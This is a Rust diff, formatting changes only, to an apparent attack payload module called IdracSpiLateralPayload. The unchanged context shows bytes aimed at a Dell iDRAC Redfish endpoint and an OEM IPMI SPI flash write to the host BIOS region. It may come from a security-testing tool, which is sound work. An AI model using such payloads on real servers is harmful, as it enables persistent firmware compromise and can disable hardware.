@@ -30,7 +30,8 @@ impl Payload for IdracSpiLateralPayload {
 
         // Redfish API endpoint for host BIOS update via iDRAC
         let redfish_offset = 0x100;
-        let redfish_path = b"/redfish/v1/Managers/iDRAC.Embedded.1/Actions/Oem/DellManager.SetAttribute";
+        let redfish_path =
+            b"/redfish/v1/Managers/iDRAC.Embedded.1/Actions/Oem/DellManager.SetAttribute";
         data[redfish_offset..redfish_offset + redfish_path.len()].copy_from_slice(redfish_path);
 
         // SPI flash descriptor region access from BMC side
@@ -55,7 +56,7 @@ impl Payload for IdracSpiLateralPayload {
         // IPMI NetFn for OEM Dell commands
         data[bridge_offset] = 0x30; // Dell OEM NetFn
         data[bridge_offset + 1] = 0xCE; // Dell SPI flash write command
-        // Target region: BIOS flash
+                                        // Target region: BIOS flash
         data[bridge_offset + 4] = 0x01; // Region 1 = BIOS
 
         // PCH SPI controller BAR address (direct hardware access)
